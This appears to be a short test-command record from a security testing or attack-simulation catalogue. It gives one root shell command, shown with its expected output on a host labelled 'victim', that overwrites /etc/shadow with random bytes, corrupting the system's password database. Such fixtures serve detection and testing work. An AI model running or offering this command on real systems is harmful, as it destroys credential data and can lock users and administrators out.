---
id: 339e03b2-e8f2-432e-897e-78826a162edb
name: Test Command
type: command
executor: ''
data: dd if=/dev/urandom of=/etc/shadow bs=1 count=2000
output: 'root@ub18:/home/victim# dd if=/dev/urandom of=/etc/shadow bs=1 count=2000

  2000+0 records in

  2000+0 records out

  2000 bytes (2.0 kB, 2.0 KiB) copied, 0.0226098 s, 88.5 kB/s

  '
created_at: '2019-09-19T19:31:53.344816+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Test Command

```bash
dd if=/dev/urandom of=/etc/shadow bs=1 count=2000
```

## Expected Output

```
root@ub18:/home/victim# dd if=/dev/urandom of=/etc/shadow bs=1 count=2000
2000+0 records in
2000+0 records out
2000 bytes (2.0 kB, 2.0 KiB) copied, 0.0226098 s, 88.5 kB/s

```
